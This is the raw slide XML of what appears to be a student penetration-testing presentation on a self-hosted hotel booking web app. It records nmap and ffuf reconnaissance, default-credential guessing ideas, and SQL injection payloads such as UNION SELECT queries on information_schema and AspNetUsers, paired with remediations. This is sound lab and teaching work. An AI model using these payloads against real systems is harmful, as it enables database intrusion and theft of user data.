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webp" ContentType="image/webp"/>
  <Override PartName="/ppt/media/image11.webp" ContentType="image/webp"/>
  <Override PartName="/ppt/media/image12.webp" ContentType="image/webp"/>
  <Override PartName="/ppt/media/image9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6" r:id="rId6"/>
    <p:sldId id="261" r:id="rId7"/>
    <p:sldId id="260" r:id="rId8"/>
    <p:sldId id="259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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-EG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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-EG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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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2853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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B0200-64E4-44AE-8ACE-4704A73EB61E}" type="datetimeFigureOut">
              <a:rPr lang="ar-EG" smtClean="0"/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2853B-B632-4AD8-8E43-84C1C4DE0226}" type="slidenum">
              <a:rPr lang="ar-EG" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="ar-E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webp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web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ebp"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.web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Pen testing hotel ecommerce</a:t>
            </a:r>
            <a:endParaRPr lang="ar-E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E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Recon</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="ar-E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&gt;&gt;docker inspect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bookifyhotek</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-app </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Network name : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bookify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-network </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ip local host  172.18.0.4 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Getway</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> local host :  172.18.0.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Port  number : 9000</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ip alpine : 192.168.1.7:9000</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> : http://192.168.1.7:9000/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Mac : aa:d6:4a:90:b3:27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ar-EG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351" y="681037"/>
            <a:ext cx="5830649" cy="51233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Assessing  docker container (target)from kali machine (attacker)</a:t>
            </a:r>
            <a:endParaRPr lang="ar-EG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188" y="1825625"/>
            <a:ext cx="7313624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Active recon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23285"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Service and Script Scan:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>nmap -sV -sC -p 5280,8082,1433 192.168.1.7</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>finding : </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" alt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422910" y="3009900"/>
          <a:ext cx="10915650" cy="2086610"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3638550"/>
                <a:gridCol w="3615055"/>
                <a:gridCol w="3662045"/>
              </a:tblGrid>
              <a:tr h="390525">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1500"/>
                        <a:t>Port</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Service</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Details</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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1685">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1500"/>
                        <a:t>1433/tcp</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Microsoft SQL Server 2022</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Version 16.00.4250.00 (CU11+), SSL certificate present (self-signed)</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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r>
                        <a:rPr sz="1500"/>
                        <a:t>5280/tcp</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>HTTP (Kestrel)</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Microsoft Kestrel httpd, Title: "Home - Bookify Hotel"</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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r>
                        <a:rPr sz="1500"/>
                        <a:t>8082/tcp</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>HTTP (PHP 8.4.21)</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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500"/>
                        <a:t>Adminer</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1500"/>
                        <a:t> database management tool login page</a:t>
                      </a:r>
                      <a:endParaRPr sz="15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325120" y="538353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action : </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>run firewall on webserver </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>&gt;&gt;docker run -p 127.0.0.1:1433:1433 mcr.microsoft.com/mssql/server</a:t>
            </a:r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755" y="5929630"/>
            <a:ext cx="7906385" cy="3775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6740" y="-86995"/>
            <a:ext cx="10057765" cy="7002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As defensive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adding security service : </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>dependancy injection in the application program.cs </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>[</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>csp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>xss protection </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ratelimitation </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>security headers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> ]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r-EG"/>
              <a:t>sqli test </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" alt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ar-EG" dirty="0"/>
              <a:t>test sqli payload </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ar-EG" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ar-EG" dirty="0"/>
              <a:t>“admin” -- </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ar-EG" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ar-EG" dirty="0"/>
              <a:t>‘or 1=1 -- </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ar-EG" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ar-EG" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="لقطة شاشة 2026-05-16 0242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5290" y="1916430"/>
            <a:ext cx="3741420" cy="30251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140" y="1916430"/>
            <a:ext cx="3741420" cy="3025140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="لقطة شاشة 2026-05-16 0243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590" y="1825625"/>
            <a:ext cx="4091940" cy="4407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payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>SELECT *FROM rooms WHERE location = 'Manchester' OR '1'='1'==&gt;blind sql ingection </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:b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9595" y="2914015"/>
            <a:ext cx="6630670" cy="3640455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69595" y="1571625"/>
            <a:ext cx="11276965" cy="10915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365125"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>payload : l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ocation=Manchester' OR 1=1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location query :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encoded sqli attempt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url validated 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963930" y="1924050"/>
            <a:ext cx="9916160" cy="895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sqli </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3110"/>
              <a:t>payload : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3110"/>
              <a:t>Manchester' UNION SELECT @@version --</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="311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en-US"/>
              <a:t>CRITICAL FINDING: SQL Injection with Database Version Extraction Confirmed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58545" y="2348865"/>
            <a:ext cx="9761220" cy="82677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12190" y="3301365"/>
            <a:ext cx="10607040" cy="17640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exploitation :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find all tables in database : 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payload :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Manchester' UNION SELECT TABLE_NAME FROM information_schema.tables --</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> Find columns in the Users table</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>payload : Manchester' UNION SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='AspNetUsers' --</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Remidiation : pramitarized query in database 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420" y="5689600"/>
            <a:ext cx="8916035" cy="39484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2: Web Enumeration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en-US" altLang="en-US"/>
              <a:t>nmap -sV --script=http-title,http-headers 192.168.1.0/24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> next step : </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>  Browse port 5500 - Check for exposed files/directories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Access Adminer (8082) - Try default credentials (admin:admin, root:root, etc.)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Explore Bookify Hotel (5280) - Look for login pages, registration, booking functionality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Enumerate SQL Server - Attempt sa blank password or common credentials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Investigate port 6666 and 7070 - Determine actual services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4185" y="-167640"/>
            <a:ext cx="5928360" cy="3596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enumeration web app :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nmap -sV --script=http-title,http-headers -p 5280,8082 192.168.1.7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kestral web server is open ==&gt; critical risk </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>remidiation in docker compose.yaml </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>creating secure network by strong cradindtials </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>and build [docker compose up --build ]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685" y="2467610"/>
            <a:ext cx="4815840" cy="20802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Web app endpoint discovery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ffuf -u http://192.168.1.6:5280/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403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authorization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identity services : </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>adding </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>asp.net users </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>roles </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>rolePermissions </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>users denied from admin dash board </a:t>
            </a:r>
            <a:endParaRPr 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6225" y="0"/>
            <a:ext cx="62915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user policy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admin can update password but  canot show it </a:t>
            </a:r>
            <a:endParaRPr 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30" y="2343150"/>
            <a:ext cx="10416540" cy="2171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20" y="4381500"/>
            <a:ext cx="3749040" cy="35890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next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nginx reverse proxy </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>integrated WAF to secure trafic , requests </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>splunk integration for monitor logging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2711</Words>
  <Application>WPS Presentation</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>149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SimSun</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Microsoft YaHei</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Pen testing hotel ecommerce</vt:lpstr>
      <vt:lpstr>Recon </vt:lpstr>
      <vt:lpstr>Assessing  docker container (target)from kali machine (attacker)</vt:lpstr>
      <vt:lpstr>Active recon </vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>As defensive </vt:lpstr>
      <vt:lpstr>sqli test </vt:lpstr>
      <vt:lpstr>payload:SELECT *FROM rooms WHERE location = 'Manchester' OR '1'='1'==&gt;blind sql ingection  </vt:lpstr>
      <vt:lpstr>payload : location=Manchester' OR 1=1</vt:lpstr>
      <vt:lpstr>sqli  payload : Manchester' UNION SELECT @@version --</vt:lpstr>
      <vt:lpstr>exploitation : </vt:lpstr>
      <vt:lpstr>2: Web Enumeration</vt:lpstr>
      <vt:lpstr>enumeration web app : </vt:lpstr>
      <vt:lpstr>Web app endpoint discovery</vt:lpstr>
      <vt:lpstr>authorization </vt:lpstr>
      <vt:lpstr>user policy </vt:lpstr>
      <vt:lpstr>what is next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Abdo Mostafa  220100374</dc:creator>
  <cp:lastModifiedBy>abdo mostafa</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-02T14:50:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-16T03:45:07Z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BA340BCD2B404C8E98BFF17F9B5E3224_12</vt:lpwstr>
  </property>
</Properties>
</file>